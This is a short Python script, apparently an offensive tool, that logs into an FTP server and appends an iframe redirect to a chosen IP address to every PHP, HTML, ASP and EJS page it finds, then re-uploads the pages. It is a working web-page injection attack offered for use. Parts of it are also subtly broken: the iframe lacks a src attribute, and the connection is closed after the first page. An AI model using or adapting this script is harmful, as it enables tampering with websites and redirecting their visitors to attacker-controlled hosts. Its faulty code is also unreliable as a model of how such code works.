import argparse
import ftplib
import os

def injectPage(ftp,page,redirect):
    ret = False
    try:
        f = open(f"{page}","w")
        ftp.retrlines("RETR " + page,f.write)

        f.write(f"<iframe>{redirect}</iframe>")
        f.close()
        f = open(page,"r")

        ftp.storlines("STOR " + page,f)
        ret = True

    except OSError as err:
        print(err)
    except Exception as err:
        print(err)
    finally:
        ftp.quit()
        return ret

parser = argparse.ArgumentParser()

parser.add_argument("host",type=str,help="Enter host.")
parser.add_argument("redirect", type=str,help="Target IP. A redirect to this IP will be injected into the FTP server")
parser.add_argument("-u","--user",type = str,help="Login Username")
parser.add_argument("-p","--pwd",type = str,help="Password")
args = parser.parse_args()
success = False

try:
    ftp = ftplib.FTP(args.host)
    if((not args.pwd) and (not args.user)):
        ftp.login()
    elif(not args.pwd):
        ftp.login(args.user)
    else:
        ftp.login(args.user,args.pwd)

    dirlist = ftp.nlst()
    print("Root Directory")
    for f in dirlist:
        print(f)

    for f in dirlist:
        if(".php" in f or ".htm" in f or ".asp" in f or ".ejs" in f):
            success = injectPage(ftp,f,args.redirect)
            

except Exception as err:
    print(err)
finally:
    print(f"\nInjection of iframe redirect to {args.redirect} on {args.host} Success: {success}")
